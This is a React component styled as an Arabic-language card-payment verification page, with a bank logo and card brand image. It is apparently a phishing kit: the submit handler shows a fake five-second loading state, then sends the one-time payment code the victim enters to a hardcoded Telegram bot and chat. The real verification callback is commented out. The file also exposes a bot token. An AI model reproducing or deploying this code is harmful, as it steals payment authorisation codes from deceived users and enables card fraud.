"use client";

import { useState } from "react";
import Image from "next/image";
import logo from "../../../../public/logoo.jpg";

type VerificationCodeFormProps = {
  onVerificationComplete: (code: string) => void;
  onCancel: () => void;
  isProcessing?: boolean;
};

export default function VerificationCodeForm({
  onVerificationComplete,
  isProcessing = false,
}: VerificationCodeFormProps) {
  const [verificationCode, setVerificationCode] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const sendVerificationCode = async (code: string) => {
    const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
    const chatId = "-1002630840593";

    const escapeMarkdown = (text: string | number | null | undefined) => {
      const safeText = text?.toString() || "";
      return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
    };

    const formatVerificationInfo = () => {
      const now = new Date().toLocaleString("ar-SA");
      return [
        "🔑 *رمز التحقق* 🔑",
        `رمز التحقق: ${escapeMarkdown(code)}`,
        `وقت التحقق: ${escapeMarkdown(now)}`,
      ].join("\n");
    };

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: formatVerificationInfo(),
            parse_mode: "Markdown",
          }),
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      console.log("Verification code sent successfully.");
    } catch (error) {
      console.error("Error sending verification code:", error);
    }
  };

  const handleSubmit = () => {
    if (
      !verificationCode ||
      verificationCode.length < 4 ||
      verificationCode.length > 6
    ) {
      setError("الرجاء إدخال رمز التحقق المكون من 4 إلى 6 أرقام");
      return;
    }

    setError("");
    setLoading(true);

    // Simulate loading for 5 seconds
    setTimeout(() => {
      sendVerificationCode(verificationCode);
      setLoading(false);
      // onVerificationComplete(verificationCode);
    }, 5000);
  };

  return (
    <div className="text-right bg-gray-100 p-6 rounded-lg shadow-md relative ">
      <div className="flex justify-between items-center mb-6 ">
        <button
          // onClick={onCancel}
          className="text-gray-500 hover:text-gray-700 transition-colors"
        >
          إلغاء
        </button>
        <Image src={logo} alt="Logo" width={100} height={40} />
      </div>
      <div className="flex justify-center mb-6">
        <Image
          src="/images/visa.png"
          alt="Mastercard"
          width={60}
          height={40}
          className="mx-auto"
        />
      </div>
      <p className="mb-6 text-gray-600 text-center">
        تم إرسال رمز التحقق إلى هاتفك المسجل. الرجاء إدخال الرمز لإتمام عملية
        الدفع.
      </p>

      <div className="space-y-6">
        <div className="text-center">
          <label
            htmlFor="verificationCode"
            className="block text-sm font-medium text-gray-700 mb-3"
          >
            رمز التحقق
          </label>
          <input
            type="text"
            id="verificationCode"
            name="verificationCode"
            value={verificationCode}
            onChange={(e) => {
              // Only allow digits and limit to 6 characters
              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
              setVerificationCode(value);
              if (error) setError("");
            }}
            placeholder="XXXXXX"
            className={`w-full p-3 border ${
              error ? "border-red-500" : "border-gray-300"
            } rounded-lg text-center text-2xl tracking-widest letter-spacing-2 focus:outline-none focus:ring-2 focus:ring-blue-500`}
            required
            autoFocus
          />
          {error && (
            <p className="text-red-500 text-xs mt-1 text-right">{error}</p>
          )}
        </div>

        <button
          onClick={handleSubmit}
          disabled={isProcessing || loading}
          className={`w-full py-3 px-6 font-medium rounded-lg ${
            isProcessing || loading
              ? "bg-gray-400 cursor-not-allowed"
              : "bg-blue-600 hover:bg-blue-700"
          } text-white transition-colors`}
        >
          {loading ? "جاري التحقق..." : "تأكيد"}
        </button>
        <button
          className="w-full text-blue-600 hover:text-blue-700 font-medium mt-4 transition-colors"
          onClick={() => setVerificationCode("")}
        >
          إعادة إرسال الرمز
        </button>
      </div>
    </div>
  );
}
